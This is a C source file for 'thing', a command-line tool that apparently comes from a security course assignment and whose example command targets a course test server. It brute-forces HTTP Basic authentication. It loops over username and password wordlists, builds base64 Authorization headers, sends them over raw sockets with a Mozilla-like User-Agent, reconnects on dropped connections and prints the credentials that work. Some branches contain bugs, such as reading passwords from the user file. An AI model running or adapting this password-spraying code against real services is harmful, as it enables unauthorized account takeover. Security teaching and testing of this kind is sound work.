#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <math.h>
#include <errno.h>

#include "thing-http.h"

//Command example ./thing -u cs338 -p password -s 80 cs338.jeffondich.com/basicauth/ http-get 

int http_main();
int connect_to_serv(struct addrinfo *servinfo);
int http_attempt(char *usr, char *pass);
// void http_output();
char* to_base64(const unsigned char *data, size_t input_length);

//HTTP Global vars
int status;
int sock;
struct addrinfo hints;
struct addrinfo *servinfo;
int bytes_sent;
char *host;
char *dir; //Directory of the server to request from
char *type; //Type of HTTP request: GET pr POST
char *charPort; //c getaddrinfo() only accepts char* for port

//Server response type
#define HTTP_AUTH_SUCCESS 0
#define HTTP_AUTH_FAILURE 1
#define HTTP_CONNECTION_CLOSED 2
#define MAX_RESPONSE_SIZE 1000

//HTTP Request/response
char *passBuffer; //stores "username:password"
char requestBuffer[500]; 
char responseBuffer[MAX_RESPONSE_SIZE];




//Base64 global vars (from https://stackoverflow.com/questions/342409/how-do-i-base64-encode-decode-in-c)
static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'};
static char *decoding_table = NULL;
static int mod_table[] = {0, 2, 1};



int http_main() {
    //Initialize global vars
    passBuffer = malloc(sizeof(char)*100);
    host = malloc(sizeof(char)*(strlen(destination)+1));
    charPort = malloc((size_t)((ceil(log10(port))+1)*sizeof(char)));
    sprintf(charPort, "%d",port);

    //Create a string with proper request syntax (eg. "GET" from "http-get", "POST" from "http-post")
    type = strstr(service,"-") + 1;
    char *charPtr = type;
    while (*charPtr != '\0') {
        *charPtr = *charPtr - (char)32;
        charPtr++;
    }

    //Dir to GET from
    dir = strstr(destination, "/");
    
    //Set the Host header
    if (dir == NULL) {
        dir = "/";
        host = destination;
    } else {
        int dirIdx = dir - destination;
        strncpy(host,destination,dirIdx+1);
        host[dirIdx] = '\0';
    }

    //Prepare the socket
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;     // Accepts both ipv4 and ipv6 protocols
    hints.ai_socktype = SOCK_STREAM; // Use TCP, not UDP

    if ((status = getaddrinfo(host, charPort, &hints, &servinfo)) != 0) {
        fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(status));
        exit(1);
    }

    //Connect to server
    connect_to_serv(servinfo);


    //Here comes the spraying
    int attemptStatus;
    if (usrFilename != NULL && passFilename != NULL) {
        while (fgets(usr, 256, usrFile) != NULL) {
            if(usr[strlen(usr)-1] == '\n') {
                usr[strlen(usr)-1] = '\0';
            }                
            while (fgets(pass, 256, passFile) != NULL) {
                
                // Replace new line with null to mark end of password
                if(pass[strlen(pass)-1] == '\n') {pass[strlen(pass)-1] = '\0';}
                attemptStatus = http_attempt(usr,pass);
                if (attemptStatus == HTTP_AUTH_SUCCESS) {break;} 
                else if (attemptStatus == HTTP_CONNECTION_CLOSED) {
                    connect_to_serv(servinfo);
                    attemptStatus = http_attempt(usr,pass);
                    if (attemptStatus == HTTP_AUTH_SUCCESS) {break;}
                    else if (attemptStatus == HTTP_CONNECTION_CLOSED) {
                        perror("Reconnection failed\n");
                    }
                }
            }
            rewind(passFile);
        }
        fclose(usrFile);
        fclose(passFile);
    } else if (usrFilename != NULL) {
        while (fgets(pass, 256, passFile) != NULL) {
            if (pass[strlen(pass)-1] == '\n') {pass[strlen(pass)-1] = '\0';}
            attemptStatus = http_attempt(usr,pass);
            if (attemptStatus == HTTP_AUTH_SUCCESS) {break;} 
            else if (attemptStatus == HTTP_CONNECTION_CLOSED) {connect_to_serv(servinfo);}
        }
    } else if (passFilename != NULL) {
        while (fgets(pass, 256, usrFile) != NULL) {
            if (pass[strlen(pass)-1] == '\n') {pass[strlen(pass)-1] = '\0';}
            attemptStatus = http_attempt(usr,pass);
            if (attemptStatus == HTTP_AUTH_SUCCESS) {break;} 
            else if (attemptStatus == HTTP_CONNECTION_CLOSED) {connect_to_serv(servinfo);}
        }
    } else {
        attemptStatus = http_attempt(usr,pass);
    }
    freeaddrinfo(servinfo); //Servinfo struct no longer needed
    return 0;
}

int connect_to_serv(struct addrinfo *servinfo) {
    //Connect to the destination (don't care if ipv4 or ipv6)
    struct addrinfo *p;
    for (p = servinfo; p != NULL; p = p->ai_next) {

        if ((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }
        
        if (connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
            continue;
        }
        break;
    }
    
    if (p == NULL) {
        fprintf(stderr, "Connection failure: %s\n",strerror(errno));
        exit(1); //Might not wanna exit right away. Should retry the connection!
    }
    return 0;
}

int http_attempt(char *usr, char *pass) {
    
    //===Prepare HTTP request===
    //Concat usr and pass for base64 encoding
    sprintf(passBuffer,"%s:%s",usr,pass);
    
    //To base64
    char *encodedPass; //Stores the base64 encoding of "username:password"
    encodedPass = to_base64((const unsigned char *)passBuffer, strlen(passBuffer));
    //printf("%s\n",encodedPass);

    sprintf(requestBuffer,
              "%s %.250s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 "
                "(Thing)\r\nConnection: "
                "keep-alive\r\nAuthorization: Basic %s\r\n\r\n",
              type, dir, host, encodedPass);

    //Send the HTTP request
    bytes_sent = send(sock, requestBuffer, strlen(requestBuffer), 0);
    if (bytes_sent != strlen(requestBuffer)) {
        perror("Request buffer too large to send in one go\nPrompt needs to make better code\n");
        exit(1);
    }

    //Receive the server's response
    int bytesRecieved = recv(sock, responseBuffer, MAX_RESPONSE_SIZE-1, 0);
    if (bytesRecieved == -1) {
        perror("recv failed\n");
        exit(1);
    } else if (bytesRecieved == 0) {
        return HTTP_CONNECTION_CLOSED;
    } else {
        responseBuffer[bytesRecieved] = '\0';
        // printf("Response:\n%s\n",responseBuffer);
        if (strstr(responseBuffer,"HTTP/1.1 2") != NULL) {
            printf("\033[0;32mAuthentication successful:\033[0m || Destination:%s || Username:%s || Password:%s\n", destination, usr, pass);
            return HTTP_AUTH_SUCCESS;
        } else {
            printf("\033[0;31mAuthentication failure:\033[0m Username:%s, Password:%s\n", usr, pass);
            return HTTP_AUTH_FAILURE;
        }
    }

    close(sock);
    return 0;
}


/*
https://stackoverflow.com/questions/342409/how-do-i-base64-encode-decode-in-c
Base64 code from user ryyst
*/
char *to_base64(const unsigned char *data, size_t input_length) {
    
    size_t output_length = 4 * ((input_length + 2) / 3);

    char *encoded_data = malloc(output_length + 1);
    if (encoded_data == NULL) return NULL;


    for (int i = 0, j = 0; i < input_length;) {

        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }

    for (int i = 0; i < mod_table[input_length % 3]; i++) {
        encoded_data[output_length - 1 - i] = '=';
    }
        

    encoded_data[output_length] = '\0';

    return encoded_data;
}